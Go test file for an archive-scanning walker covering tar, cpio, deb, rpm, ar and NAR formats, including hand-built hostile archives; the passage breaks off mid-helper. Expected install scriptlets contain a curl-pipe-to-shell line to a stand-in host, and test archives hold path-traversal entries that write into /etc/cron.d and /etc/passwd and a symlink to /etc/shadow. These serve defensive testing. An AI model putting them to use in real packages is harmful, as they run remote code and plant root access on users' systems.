package contentscan

import (
	"archive/tar"
	"archive/zip"
	"bufio"
	"bytes"
	"compress/gzip"
	"context"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"reflect"
	"sort"
	"strings"
	"testing"

	"github.com/klauspost/compress/zstd"
	"github.com/ulikunitz/xz"
)

// The fixtures under testdata/formats were written by the real packaging tools
// (dpkg-deb, rpmbuild, cpio, ar, xz, zstd, lzma, nix-store; see
// testdata/formats/src/generate.sh), so these tests check the walker against
// what those tools produce rather than against archives built by the code under
// test. The hand-built archives further down cover what no well-behaved tool
// writes: hostile and malformed input.

// formatWalk is everything one walk reported.
type formatWalk struct {
	stats   ArchiveStats
	err     error
	names   []string // in archive order
	files   map[string]ArchiveEntry
	content map[string]string
	links   map[string]string
	hard    map[string]bool
}

var testLimits = ArchiveLimits{
	MaxArchiveBytes: 4 << 20, MaxUnpackedBytes: 32 << 20, MaxFileBytes: 1 << 20, MaxFiles: 2000, MaxCompressionRatio: 500,
}

func walkBytes(t *testing.T, data []byte, lim ArchiveLimits, opts ArchiveOptions) formatWalk {
	t.Helper()
	out := formatWalk{files: map[string]ArchiveEntry{}, content: map[string]string{}, links: map[string]string{}, hard: map[string]bool{}}
	out.stats, out.err = WalkArtifact(context.Background(), bytes.NewReader(data), lim, opts,
		func(e ArchiveEntry) bool {
			if _, dup := out.files[e.Name]; dup {
				t.Errorf("entry %q reported twice", e.Name)
			}
			out.names = append(out.names, e.Name)
			out.content[e.Name] = string(e.Data)
			e.Data = nil
			out.files[e.Name] = e
			return true
		},
		func(l ArchiveLink) {
			out.links[l.Name] = l.Target
			out.hard[l.Name] = l.Hard
		})
	return out
}

func fixture(t *testing.T, name string) []byte {
	t.Helper()
	data, err := os.ReadFile(filepath.Join("testdata", "formats", name))
	if err != nil {
		t.Fatalf("reading fixture: %v", err)
	}
	return data
}

func (w formatWalk) sortedNames() []string {
	names := append([]string(nil), w.names...)
	sort.Strings(names)
	return names
}

func (w formatWalk) mustBeComplete(t *testing.T, format string) {
	t.Helper()
	if w.err != nil {
		t.Fatalf("walk failed: %v", w.err)
	}
	if w.stats.Format != format {
		t.Errorf("format = %q, want %q", w.stats.Format, format)
	}
	if !w.stats.Complete() {
		t.Errorf("walk incomplete: %v", w.stats.Incomplete)
	}
	if w.stats.Files != len(w.names) {
		t.Errorf("stats.Files = %d, visitor saw %d", w.stats.Files, len(w.names))
	}
}

// The tree every tar, cpio and NAR "hello" fixture holds.
func assertHelloTree(t *testing.T, w formatWalk, root, script string) {
	t.Helper()
	wantNames := []string{root + "bin/hello", root + "share/README"}
	if got := w.sortedNames(); !reflect.DeepEqual(got, wantNames) {
		t.Fatalf("files = %v, want %v", got, wantNames)
	}
	if got := w.content[root+"bin/hello"]; got != script {
		t.Errorf("bin/hello = %q, want %q", got, script)
	}
	if got := w.content[root+"share/README"]; got != "plain text file\n" {
		t.Errorf("share/README = %q", got)
	}
	if f := w.files[root+"bin/hello"]; f.Mode != 0o755 || !f.Executable() || f.Size != int64(len(script)) || f.Truncated || f.Synthetic {
		t.Errorf("bin/hello entry = %+v", f)
	}
	if f := w.files[root+"share/README"]; f.Mode != 0o644 || f.Executable() || f.Size != 16 {
		t.Errorf("share/README entry = %+v", f)
	}
	if got, ok := w.links[root+"bin/readme-link"]; !ok || got != "../share/README" || len(w.links) != 1 {
		t.Errorf("links = %v", w.links)
	}
	if w.hard[root+"bin/readme-link"] {
		t.Error("a symbolic link was reported as a hard link")
	}
	if w.stats.Links != 1 || w.stats.Others != 0 {
		t.Errorf("links/others = %d/%d", w.stats.Links, w.stats.Others)
	}
}

func TestWalkTarUnderEveryCompression(t *testing.T) {
	const script = "#!/bin/sh\necho hello from cpio\n"
	for file, format := range map[string]string{
		"hello.tar.xz":             "tar.xz",
		"hello-sha256.tar.xz":      "tar.xz", // SHA-256 block check: 32 bytes to skip
		"hello-nocheck.tar.xz":     "tar.xz", // no block check at all
		"hello-multistream.tar.xz": "tar.xz", // two concatenated streams, the second multi-block
		"hello-padded.tar.xz":      "tar.xz", // stream padding between two streams
		"hello.tar.zst":            "tar.zst",
		"hello.tar.lzma":           "tar.lzma",
		"hello.tar.bz2":            "tar.bz2",
	} {
		t.Run(file, func(t *testing.T) {
			w := walkBytes(t, fixture(t, file), testLimits, ArchiveOptions{})
			w.mustBeComplete(t, format)
			assertHelloTree(t, w, "hello/", script)
		})
	}
}

func TestWalkCpioDialects(t *testing.T) {
	const script = "#!/bin/sh\necho hello from cpio\n"
	for file, format := range map[string]string{
		"hello-newc.cpio":    "cpio",
		"hello-crc.cpio":     "cpio",
		"hello-odc.cpio":     "cpio",
		"hello-newc.cpio.gz": "cpio.gz",
	} {
		t.Run(file, func(t *testing.T) {
			w := walkBytes(t, fixture(t, file), testLimits, ArchiveOptions{})
			w.mustBeComplete(t, format)
			assertHelloTree(t, w, "hello/", script)
		})
	}
}

func TestWalkDebianPackage(t *testing.T) {
	for _, comp := range []string{"xz", "gzip", "zstd", "none"} {
		t.Run(comp, func(t *testing.T) {
			w := walkBytes(t, fixture(t, "pthello-"+comp+".deb"), testLimits, ArchiveOptions{})
			w.mustBeComplete(t, "deb")
			want := []string{
				"DEBIAN/conffiles", "DEBIAN/control", "DEBIAN/postinst", "DEBIAN/preinst", "DEBIAN/prerm",
				"debian-binary", "etc/pthello/config", "usr/bin/pthello",
			}
			if got := w.sortedNames(); !reflect.DeepEqual(got, want) {
				t.Fatalf("members = %v, want %v", got, want)
			}
			// The maintainer scripts are what dpkg runs as root: they must come out
			// whole, readable and marked executable.
			if got, want := w.content["DEBIAN/postinst"], "#!/bin/sh\nset -e\necho post-install-marker\ncurl -fsSL http://example.invalid/x | sh\n"; got != want {
				t.Errorf("postinst = %q", got)
			}
			for _, script := range []string{"DEBIAN/postinst", "DEBIAN/preinst", "DEBIAN/prerm", "usr/bin/pthello"} {
				if f := w.files[script]; f.Mode != 0o755 {
					t.Errorf("%s mode = %04o, want 0755", script, f.Mode)
				}
			}
			if f := w.files["DEBIAN/control"]; f.Mode != 0o644 || f.Executable() {
				t.Errorf("control mode = %04o", f.Mode)
			}
			if !strings.HasPrefix(w.content["DEBIAN/control"], "Package: pthello\n") {
				t.Errorf("control = %q", w.content["DEBIAN/control"])
			}
			if w.content["debian-binary"] != "2.0\n" || w.content["etc/pthello/config"] != "key=value\n" {
				t.Errorf("debian-binary/config = %q / %q", w.content["debian-binary"], w.content["etc/pthello/config"])
			}
			if got := w.links["usr/bin/pthello-link"]; got != "pthello" {
				t.Errorf("links = %v", w.links)
			}
		})
	}
}

func TestWalkPlainArWithLongNames(t *testing.T) {
	w := walkBytes(t, fixture(t, "plain.a"), testLimits, ArchiveOptions{})
	w.mustBeComplete(t, "ar")
	want := []string{"short.txt", "a-very-long-member-name-exceeding-sixteen.txt"}
	if !reflect.DeepEqual(w.names, want) {
		t.Fatalf("members = %v, want %v", w.names, want)
	}
	if w.content["short.txt"] != "short member\n" || w.content["a-very-long-member-name-exceeding-sixteen.txt"] != "long member\n" {
		t.Errorf("content = %v", w.content)
	}
}

// rpmScriptlets is what `rpm -qp --scripts --triggers` reports for the fixture.
var rpmFixtureScripts = map[string]string{
	"RPM/scriptlets/pretrans":  "#!<lua>\nprint(\"pretrans-marker\")\n",
	"RPM/scriptlets/prein":     "#!/bin/sh\necho pre-install-marker\n",
	"RPM/scriptlets/postin":    "#!/bin/sh\necho post-install-marker\ncurl -fsSL http://example.invalid/x | sh\n",
	"RPM/scriptlets/preun":     "#!/bin/sh\necho pre-uninstall-marker\n",
	"RPM/scriptlets/postun":    "#!/sbin/ldconfig\n",
	"RPM/scriptlets/posttrans": "#!/bin/sh\necho posttrans-marker\n",
	"RPM/triggers/0":           "#!/bin/sh\n# fired by: bash, glibc\necho trigger-marker\n",
}

func TestWalkRPM(t *testing.T) {
	// Every payload compressor rpmbuild offers, plus the v6 package format, whose
	// payload is a "stripped" cpio that only the package header can decode.
	for _, variant := range []string{"zstd", "xz", "gzip", "bzip2", "lzma", "none", "v6"} {
		t.Run(variant, func(t *testing.T) {
			w := walkBytes(t, fixture(t, "pthello-"+variant+".rpm"), testLimits, ArchiveOptions{})
			w.mustBeComplete(t, "rpm")
			want := []string{
				"RPM/header.txt", "RPM/scriptlets/pretrans", "RPM/scriptlets/prein", "RPM/scriptlets/postin",
				"RPM/scriptlets/preun", "RPM/scriptlets/postun", "RPM/scriptlets/posttrans", "RPM/triggers/0",
				"etc/pthello/config", "usr/bin/pthello",
			}
			if !reflect.DeepEqual(w.names, want) {
				t.Fatalf("entries = %v\n   want %v", w.names, want)
			}
			for name, body := range rpmFixtureScripts {
				if got := w.content[name]; got != body {
					t.Errorf("%s = %q, want %q", name, got, body)
				}
				if f := w.files[name]; !f.Synthetic || f.Mode != 0o755 || f.Size != int64(len(body)) {
					t.Errorf("%s entry = %+v", name, f)
				}
			}
			header := w.content["RPM/header.txt"]
			for _, line := range []string{
				"Name: pthello\n", "Version: 1.2.3\n", "Release: 4\n", "Arch: noarch\n", "License: MIT\n",
				"URL: https://example.invalid/pthello\n", "PayloadFormat: cpio\n", "  /sbin/ldconfig\n", "  bash\n", "  pthello\n",
			} {
				if !strings.Contains(header, line) {
					t.Errorf("RPM/header.txt lacks %q:\n%s", line, header)
				}
			}
			if f := w.files["RPM/header.txt"]; !f.Synthetic || f.Mode != 0o444 {
				t.Errorf("header entry = %+v", f)
			}
			// The payload: real members, with the modes the package installs.
			if got := w.content["usr/bin/pthello"]; got != "#!/usr/bin/sh\necho hello from pthello\n" {
				t.Errorf("usr/bin/pthello = %q", got)
			}
			if f := w.files["usr/bin/pthello"]; f.Synthetic || f.Mode != 0o755 || f.Size != 38 {
				t.Errorf("usr/bin/pthello entry = %+v", f)
			}
			if f := w.files["etc/pthello/config"]; f.Mode != 0o644 || w.content["etc/pthello/config"] != "key=value\n" {
				t.Errorf("config entry = %+v / %q", f, w.content["etc/pthello/config"])
			}
			if got := w.links["usr/bin/pthello-link"]; got != "pthello" || len(w.links) != 1 {
				t.Errorf("links = %v", w.links)
			}
			if _, listed := w.files["RPM/files.txt"]; listed {
				t.Error("RPM/files.txt was added although the payload was formatWalk whole")
			}
		})
	}
}

// When the payload cannot be formatWalk, the scriptlets — which live in the header —
// must still come out, and the header's file table stands in for the inventory.
func TestWalkRPMFallsBackToTheHeaderFileList(t *testing.T) {
	whole := fixture(t, "pthello-zstd.rpm")
	// Cut the package off inside its payload, and cap the read just short of it.
	for name, w := range map[string]formatWalk{
		"truncated payload":   walkBytes(t, whole[:len(whole)-40], testLimits, ArchiveOptions{}),
		"payload not zstd":    walkBytes(t, append(append([]byte(nil), whole[:len(whole)-150]...), bytes.Repeat([]byte{0xAA}, 150)...), testLimits, ArchiveOptions{}),
		"archive limit":       walkBytes(t, whole, ArchiveLimits{MaxArchiveBytes: int64(len(whole) - 60), MaxUnpackedBytes: 1 << 20, MaxFileBytes: 1 << 20, MaxFiles: 100}, ArchiveOptions{}),
		"v6, cut in payload":  walkBytes(t, fixture(t, "pthello-v6.rpm")[:len(fixture(t, "pthello-v6.rpm"))-30], testLimits, ArchiveOptions{}),
		"no payload at all":   walkBytes(t, whole[:payloadOffset(t, whole)], testLimits, ArchiveOptions{}),
		"unknown compression": walkBytes(t, append(append([]byte(nil), whole[:payloadOffset(t, whole)]...), "LZIP\x01 not a known stream"...), testLimits, ArchiveOptions{}),
	} {
		t.Run(name, func(t *testing.T) {
			if w.err != nil {
				t.Fatalf("walk failed: %v", w.err)
			}
			for script, body := range rpmFixtureScripts {
				if w.content[script] != body {
					t.Errorf("%s = %q", script, w.content[script])
				}
			}
			list, ok := w.content["RPM/files.txt"]
			if !ok {
				t.Fatalf("no RPM/files.txt; entries = %v, incomplete = %v", w.names, w.stats.Incomplete)
			}
			for _, line := range []string{"# 3 file(s) listed in the package header: mode size path\n",
				"100644 10 /etc/pthello/config\n", "100755 38 /usr/bin/pthello\n", "120777 7 /usr/bin/pthello-link\n"} {
				if !strings.Contains(list, line) {
					t.Errorf("RPM/files.txt lacks %q:\n%s", line, list)
				}
			}
			if !w.files["RPM/files.txt"].Synthetic {
				t.Error("RPM/files.txt is not marked synthetic")
			}
			if name == "unknown compression" || name == "payload not zstd" {
				if !hasReason(w.stats, IncompleteNestedFormat) && !hasReason(w.stats, IncompleteMalformed) {
					t.Errorf("incomplete = %v, want the payload reported as unreadable", w.stats.Incomplete)
				}
			}
		})
	}
}

// payloadOffset finds where an RPM's payload starts by walking its two headers.
func payloadOffset(t *testing.T, rpm []byte) int {
	t.Helper()
	off := rpmLeadSize
	for i := 0; i < 2; i++ {
		il := int(binary.BigEndian.Uint32(rpm[off+8:]))
		dl := int(binary.BigEndian.Uint32(rpm[off+12:]))
		off += 16 + il*16 + dl
		if i == 0 {
			off += (8 - off%8) % 8 // the signature header is padded
		}
	}
	if off >= len(rpm) {
		t.Fatalf("payload offset %d beyond the package (%d bytes)", off, len(rpm))
	}
	return off
}

func TestWalkRPMRejectsWhatIsNotOne(t *testing.T) {
	whole := fixture(t, "pthello-gzip.rpm")
	for name, data := range map[string][]byte{
		"lead only":               whole[:rpmLeadSize],
		"cut in signature header": whole[:rpmLeadSize+40],
		"bad header magic":        append(append([]byte(nil), whole[:rpmLeadSize]...), bytes.Repeat([]byte{0x41}, 400)...),
	} {
		t.Run(name, func(t *testing.T) {
			w := walkBytes(t, data, testLimits, ArchiveOptions{})
			if !errors.Is(w.err, ErrUnrecognizedArchive) {
				t.Errorf("err = %v, want ErrUnrecognizedArchive", w.err)
			}
			if len(w.names) != 0 {
				t.Errorf("entries from a broken package: %v", w.names)
			}
		})
	}

	// A header that claims more tags or data than the walker will hold is not
	// read into memory.
	big := append([]byte(nil), whole...)
	main := rpmLeadSize + 16 + int(binary.BigEndian.Uint32(whole[rpmLeadSize+8:]))*16 + int(binary.BigEndian.Uint32(whole[rpmLeadSize+12:]))
	main += (8 - main%8) % 8
	binary.BigEndian.PutUint32(big[main+12:], maxRPMStore+1)
	if w := walkBytes(t, big, testLimits, ArchiveOptions{}); !errors.Is(w.err, ErrUnrecognizedArchive) {
		t.Errorf("oversized header store: err = %v", w.err)
	}
	binary.BigEndian.PutUint32(big[main+12:], binary.BigEndian.Uint32(whole[main+12:]))
	binary.BigEndian.PutUint32(big[main+8:], maxRPMIndex+1)
	if w := walkBytes(t, big, testLimits, ArchiveOptions{}); !errors.Is(w.err, ErrUnrecognizedArchive) {
		t.Errorf("oversized header index: err = %v", w.err)
	}
}

func TestRPMHeaderAccessorsAreBoundsChecked(t *testing.T) {
	h := &rpmHeader{
		store: []byte("alpha\x00beta\x00\x00\x01\x00\x02unterminated"),
		index: []rpmIndexEntry{
			{tag: 1, typ: rpmTypeString, offset: 0, count: 1},
			{tag: 2, typ: rpmTypeStringArray, offset: 0, count: 2},
			{tag: 3, typ: rpmTypeStringArray, offset: 6, count: 1000}, // claims far more than the store holds
			{tag: 4, typ: rpmTypeInt16, offset: 11, count: 2},
			{tag: 5, typ: rpmTypeInt32, offset: 1 << 30, count: 4},  // offset outside the store
			{tag: 6, typ: rpmTypeString, offset: 15, count: 1},      // no terminating NUL
			{tag: 7, typ: rpmTypeInt64, offset: 20, count: 1 << 31}, // runs off the end
			{tag: 8, typ: 7 /* BIN */, offset: 0, count: 4},
		},
	}
	if got := h.str(1); got != "alpha" {
		t.Errorf("string = %q", got)
	}
	if got := h.strs(2); !reflect.DeepEqual(got, []string{"alpha", "beta"}) {
		t.Errorf("string array = %q", got)
	}
	// Elements are read until the store runs out, never past it.
	if got := h.strs(3); len(got) < 2 || got[0] != "beta" || got[1] != "" || len(got) > 10 {
		t.Errorf("over-long string array = %q", got)
	}
	if got := h.ints(4); !reflect.DeepEqual(got, []uint64{1, 2}) {
		t.Errorf("int16 array = %v", got)
	}
	if got := h.ints(5); got != nil {
		t.Errorf("ints at an offset outside the store = %v", got)
	}
	if got := h.str(6); got != "unterminated" {
		t.Errorf("unterminated string = %q", got)
	}
	if got := h.ints(7); len(got) != 0 {
		t.Errorf("int64 array running off the store = %v", got)
	}
	if h.strs(8) != nil || h.ints(8) != nil || h.str(99) != "" || h.ints(99) != nil {
		t.Error("a tag of another type, or an absent tag, yielded values")
	}
	if got := h.strsN(2, 1); !reflect.DeepEqual(got, []string{"alpha"}) {
		t.Errorf("bounded string array = %q", got)
	}
}

func TestWalkNAR(t *testing.T) {
	for file, format := range map[string]string{"hello.nar": "nar", "hello.nar.xz": "nar.xz", "hello.nar.zst": "nar.zst", "hello.nar.bz2": "nar.bz2"} {
		t.Run(file, func(t *testing.T) {
			w := walkBytes(t, fixture(t, file), testLimits, ArchiveOptions{})
			w.mustBeComplete(t, format)
			want := []string{"bin/hello", "empty", "share/doc/README", "share/doc/deep/er/file.txt"}
			if got := w.sortedNames(); !reflect.DeepEqual(got, want) {
				t.Fatalf("files = %v, want %v", got, want)
			}
			if got := w.content["bin/hello"]; got != "#!/bin/sh\necho hello from nar\n" {
				t.Errorf("bin/hello = %q", got)
			}
			// A NAR records one permission bit: executable or not.
			if f := w.files["bin/hello"]; f.Mode != 0o555 || !f.Executable() || f.Size != 30 {
				t.Errorf("bin/hello entry = %+v", f)
			}
			if f := w.files["share/doc/README"]; f.Mode != 0o444 || f.Executable() {
				t.Errorf("README entry = %+v", f)
			}
			if f := w.files["empty"]; f.Size != 0 || w.content["empty"] != "" {
				t.Errorf("empty entry = %+v", f)
			}
			if w.content["share/doc/deep/er/file.txt"] != "nested\n" {
				t.Errorf("nested file = %q", w.content["share/doc/deep/er/file.txt"])
			}
			if got := w.links["bin/readme-link"]; got != "../share/doc/README" || len(w.links) != 1 {
				t.Errorf("links = %v", w.links)
			}
		})
	}

	// A store path that is a single file is a NAR whose root is that file.
	w := walkBytes(t, fixture(t, "single.nar"), testLimits, ArchiveOptions{})
	w.mustBeComplete(t, "nar")
	if !reflect.DeepEqual(w.names, []string{"content"}) || w.content["content"] != "just one file\n" {
		t.Errorf("single-file NAR = %v / %q", w.names, w.content["content"])
	}
}

// --- hand-built archives ----------------------------------------------------

// narWriter writes NAR tokens.
type narWriter struct{ bytes.Buffer }

func (n *narWriter) str(s string) *narWriter {
	var l [8]byte
	binary.LittleEndian.PutUint64(l[:], uint64(len(s)))
	n.Write(l[:])
	n.WriteString(s)
	if pad := (8 - len(s)%8) % 8; pad > 0 {
		n.Write(make([]byte, pad))
	}
	return n
}

func (n *narWriter) strs(tokens ...string) *narWriter {
	for _, tok := range tokens {
		n.str(tok)
	}
	return n
}

func (n *narWriter) file(name, content string, exec bool) *narWriter {
	n.strs("entry", "(", "name", name, "node", "(", "type", "regular")
	if exec {
		n.strs("executable", "")
	}
	return n.strs("contents", content, ")", ")")
}

func TestWalkNARHostileInput(t *testing.T) {
	// Entry names a real Nix would refuse are passed on verbatim, so the consumer
	// sees an archive that tries to climb out of its root.
	var n narWriter
	n.strs("nix-archive-1", "(", "type", "directory")
	n.file("../../etc/cron.d/evil", "* * * * * root sh\n", false)
	n.file("ok", "fine\n", true)
	n.strs("entry", "(", "name", "link", "node", "(", "type", "symlink", "target", "/etc/shadow", ")", ")")
	n.str(")")
	w := walkBytes(t, n.Bytes(), testLimits, ArchiveOptions{})
	w.mustBeComplete(t, "nar")
	if _, ok := w.content["../../etc/cron.d/evil"]; !ok {
		t.Errorf("escaping name was not reported verbatim: %v", w.names)
	}
	if w.files["ok"].Mode != 0o555 || w.files["../../etc/cron.d/evil"].Mode != 0o444 {
		t.Errorf("modes = %+v", w.files)
	}
	if w.links["link"] != "/etc/shadow" {
		t.Errorf("links = %v", w.links)
	}

	// Directory nesting is bounded: the parser recurses once per level.
	var deep narWriter
	deep.str("nix-archive-1")
	for i := 0; i < maxNARDepth+10; i++ {
		deep.strs("(", "type", "directory", "entry", "(", "name", "d", "node")
	}
	w = walkBytes(t, deep.Bytes(), testLimits, ArchiveOptions{})
	if w.err == nil && w.stats.Complete() {
		t.Error("a NAR nested deeper than the limit was formatWalk as complete")
	}

	// A token that claims to be enormous is refused, not allocated.
	var huge narWriter
	huge.str("nix-archive-1")
	huge.Write([]byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x7f})
	if w := walkBytes(t, huge.Bytes(), testLimits, ArchiveOptions{}); !errors.Is(w.err, ErrUnrecognizedArchive) {
		t.Errorf("oversized token: err = %v", w.err)
	}

	// Truncation after the first file: what was read stands, and the walk says
	// it is incomplete.
	var cut narWriter
	cut.strs("nix-archive-1", "(", "type", "directory")
	cut.file("first", "kept\n", false)
	cut.strs("entry", "(", "name", "second", "node", "(", "type", "regular", "contents")
	cut.Write([]byte{9, 0, 0, 0, 0, 0, 0, 0, 'c', 'u', 't'})
	w = walkBytes(t, cut.Bytes(), testLimits, ArchiveOptions{})
	if w.err != nil || w.content["first"] != "kept\n" {
		t.Fatalf("truncated NAR: err=%v files=%v", w.err, w.names)
	}
	if !hasReason(w.stats, IncompleteMalformed) {
		t.Errorf("incomplete = %v, want malformed-container", w.stats.Incomplete)
	}

	// Garbage where the node type should be.
	var bad narWriter
	bad.strs("nix-archive-1", "(", "type", "socket", ")")
	if w := walkBytes(t, bad.Bytes(), testLimits, ArchiveOptions{}); !errors.Is(w.err, ErrUnrecognizedArchive) {
		t.Errorf("unknown node type: err = %v", w.err)
	}

	// The file limit stops the walk without calling the archive malformed.
	var many narWriter
	many.strs("nix-archive-1", "(", "type", "directory")
	for i := 0; i < 20; i++ {
		many.file(fmt.Sprintf("f%02d", i), "x", false)
	}
	many.str(")")
	lim := testLimits
	lim.MaxFiles = 5
	w = walkBytes(t, many.Bytes(), lim, ArchiveOptions{})
	if w.err != nil || len(w.names) != 5 || !hasReason(w.stats, IncompleteFiles) || hasReason(w.stats, IncompleteMalformed) {
		t.Errorf("file limit: err=%v files=%d incomplete=%v", w.err, len(w.names), w.stats.Incomplete)
	}
}

// newcEntry renders one newc cpio member.
func newcEntry(name string, mode uint32, data string) []byte {
	var b bytes.Buffer
	fmt.Fprintf(&b, "070701%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x",
		1, mode, 0, 0, 1, 0, len(data), 0, 0, 0, 0, len(name)+1, 0)
	b.WriteString(name)
	b.WriteByte(0)
	for b.Len()%4 != 0 {
		b.WriteByte(0)
	}
	b.WriteString(data)
	for b.Len()%4 != 0 {
		b.WriteByte(0)
	}
	return b.Bytes()
}

func TestWalkCpioHostileInput(t *testing.T) {
	trailer := newcEntry("TRAILER!!!", 0, "")
	var a bytes.Buffer
	a.Write(newcEntry("./usr/bin/tool", 0o100755, "#!/bin/sh\n"))
	a.Write(newcEntry("../../../etc/passwd", 0o100644, "root::0:0::/:/bin/sh\n"))
	a.Write(newcEntry("dev/null", 0o020666, ""))
	a.Write(newcEntry("usr/lib", 0o040755, ""))
	a.Write(newcEntry("usr/bin/alias", 0o120777, "tool"))
	a.Write(trailer)
	a.Write(newcEntry("after-the-trailer", 0o100644, "never read"))
	w := walkBytes(t, a.Bytes(), testLimits, ArchiveOptions{})
	w.mustBeComplete(t, "cpio")
	if !reflect.DeepEqual(w.names, []string{"usr/bin/tool", "../../../etc/passwd"}) {
		t.Fatalf("members = %v", w.names)
	}
	if w.files["usr/bin/tool"].Mode != 0o755 || w.files["../../../etc/passwd"].Mode != 0o644 {
		t.Errorf("modes = %+v", w.files)
	}
	if w.links["usr/bin/alias"] != "tool" || w.stats.Links != 1 || w.stats.Others != 1 {
		t.Errorf("links=%v others=%d", w.links, w.stats.Others)
	}

	// A header that breaks off after a good member: the member stands and the
	// walk is reported incomplete.
	broken := append(newcEntry("good", 0o100644, "kept\n"), "070701garbage-not-hex"...)
	w = walkBytes(t, broken, testLimits, ArchiveOptions{})
	if w.err != nil || w.content["good"] != "kept\n" || !hasReason(w.stats, IncompleteMalformed) {
		t.Errorf("broken cpio: err=%v files=%v incomplete=%v", w.err, w.names, w.stats.Incomplete)
	}

	// A name field larger than any path is refused before it is allocated.
	bigName := []byte(fmt.Sprintf("070701%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x", 1, 0o100644, 0, 0, 1, 0, 0, 0, 0, 0, 0, maxCpioName+1, 0))
	w = walkBytes(t, append(newcEntry("good", 0o100644, "kept\n"), bigName...), testLimits, ArchiveOptions{})
	if w.content["good"] != "kept\n" || !hasReason(w.stats, IncompleteMalformed) || len(w.names) != 1 {
		t.Errorf("oversized name: files=%v incomplete=%v", w.names, w.stats.Incomplete)
	}

	// A stripped member without the package header that explains it.
	if w := walkBytes(t, []byte("07070X00000000\x00\x00data"), testLimits, ArchiveOptions{}); !errors.Is(w.err, ErrUnrecognizedArchive) {
		t.Errorf("stripped cpio on its own: err = %v", w.err)
	}
	// A stripped member whose index the header does not have.
	table := []cpioIndexed{{path: "./a", mode: 0o100644, size: 2}}
	wk := &walker{ctx: context.Background(), b: budget{maxArchiveBytes: 1 << 20, maxFileBytes: 1 << 20, maxFiles: 10}, in: &countingReader{}}
	var seen []string
	wk.visit = func(wf walkedFile) bool { seen = append(seen, wf.name+"="+string(wf.data)); return true }
	stream := "07070X00000000\x00\x00hi\x00\x00" + "07070X00000007\x00\x00zz"
	if err := wk.walkCpio(strings.NewReader(stream), "", 1, table); err != nil {
		t.Fatalf("walkCpio: %v", err)
	}
	if !reflect.DeepEqual(seen, []string{"a=hi"}) || len(wk.stats.reasons) != 1 || wk.stats.reasons[0] != stopMalformed {
		t.Errorf("stripped cpio with an unknown index: files=%v reasons=%v", seen, wk.stats.reasons)
	}
}

// arMember renders one ar member with a short name.
func arMember(name string, data []byte) []byte {
	var b bytes.Buffer
	fmt.Fprintf(&b, "%-16s%-12d%-6d%-6d%-8o%-10d`\n", name, 0, 0, 0, 0o100644, len(data))
	b.Write(data)
	if len(data)%2 != 0 {
		b.WriteByte('\n')
	}
	return b.Bytes()
}

func TestWalkArVariants(t *testing.T) {
	// BSD long names ("#1/<len>": the name sits in front of the data and counts
	// toward the member's size), a symbol table, and odd-sized members.
	var a bytes.Buffer
	a.WriteString(arMagic)
	a.Write(arMember("/", []byte("symtab!")))
	long := "a-name-longer-than-sixteen-bytes.o"
	a.Write(arMember(fmt.Sprintf("#1/%d", len(long)), []byte(long+"OBJECT")))
	a.Write(arMember("odd/", []byte("abc")))
	a.Write(arMember("even/", []byte("abcd")))
	w := walkBytes(t, a.Bytes(), testLimits, ArchiveOptions{})
	w.mustBeComplete(t, "ar")
	if !reflect.DeepEqual(w.names, []string{long, "odd", "even"}) {
		t.Fatalf("members = %v", w.names)
	}
	if w.content[long] != "OBJECT" || w.files[long].Size != 6 || w.content["odd"] != "abc" || w.content["even"] != "abcd" {
		t.Errorf("content = %v", w.content)
	}

	// A member header that is not one: what precedes it stands.
	var bad bytes.Buffer
	bad.WriteString(arMagic)
	bad.Write(arMember("first/", []byte("kept")))
	bad.WriteString(strings.Repeat("x", arHeaderSize))
	w = walkBytes(t, bad.Bytes(), testLimits, ArchiveOptions{})
	if w.err != nil || !reflect.DeepEqual(w.names, []string{"first"}) || !hasReason(w.stats, IncompleteMalformed) {
		t.Errorf("bad header: err=%v files=%v incomplete=%v", w.err, w.names, w.stats.Incomplete)
	}

	// An ar that is only named like a .deb does not get the Debian treatment: a
	// "control.tar" member of a plain ar is one opaque member.
	var notDeb bytes.Buffer
	notDeb.WriteString(arMagic)
	notDeb.Write(arMember("other/", []byte("x")))
	notDeb.Write(arMember("control.tar.gz/", gzipOf(tarOf(map[string]string{"postinst": "#!/bin/sh\n"}))))
	w = walkBytes(t, notDeb.Bytes(), testLimits, ArchiveOptions{})
	if w.stats.Format != "ar" || !reflect.DeepEqual(w.names, []string{"other", "control.tar.gz"}) {
		t.Errorf("plain ar: format=%q members=%v", w.stats.Format, w.names)
	}

	// The real thing, built by hand with a control archive that holds a script
	// in a sub-directory and an escaping name.
	var deb bytes.Buffer
	deb.WriteString(arMagic)
	deb.Write(arMember("debian-binary", []byte("2.0\n")))
	deb.Write(arMember("control.tar.gz", gzipOf(tarOf(map[string]string{"./postinst": "#!/bin/sh\nid\n", "../outside": "x"}))))
	deb.Write(arMember("data.tar", tarOf(map[string]string{"./usr/bin/x": "ELF"})))
	w = walkBytes(t, deb.Bytes(), testLimits, ArchiveOptions{})
	w.mustBeComplete(t, "deb")
	if got := w.sortedNames(); !reflect.DeepEqual(got, []string{"DEBIAN/../outside", "DEBIAN/postinst", "debian-binary", "usr/bin/x"}) {
		t.Errorf("deb members = %v", got)
	}
}

func tarOf(files map[string]string) []byte {
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	names := make([]string, 0, len(files))
	for n := range files {
		names = append(names, n)
	}
	sort.Strings(names)
	for _, n := range names {
		_ = tw.WriteHeader(&tar.Header{Name: n, Mode: 0o644, Size: int64(len(files[n])), Typeflag: tar.TypeReg})
		_, _ = io.WriteString(tw, files[n])
	}
	_ = tw.Close()
	return buf.Bytes()
}

func gzipOf(data []byte) []byte {
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	_, _ = gw.Write(data)
	_ = gw.Close()
	return buf.Bytes()
}

func zstdOf(t *testing.T, data []byte) []byte {
	t.Helper()
	var buf bytes.Buffer
	zw, err := zstd.NewWriter(&buf)
	if err != nil {
		t.Fatal(err)
	}
	_, _ = zw.Write(data)
	_ = zw.Close()
	return buf.Bytes()
}

func xzOf(t *testing.T, data []byte) []byte {
	t.Helper()
	var buf bytes.Buffer
	xw, err := xz.NewWriter(&buf)
	if err != nil {
		t.Fatal(err)
	}
	_, _ = xw.Write(data)
	_ = xw.Close()
	return buf.Bytes()
}

func zipOf(files map[string][]byte) []byte {
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	names := make([]string, 0, len(files))
	for n := range files {
		names = append(names, n)
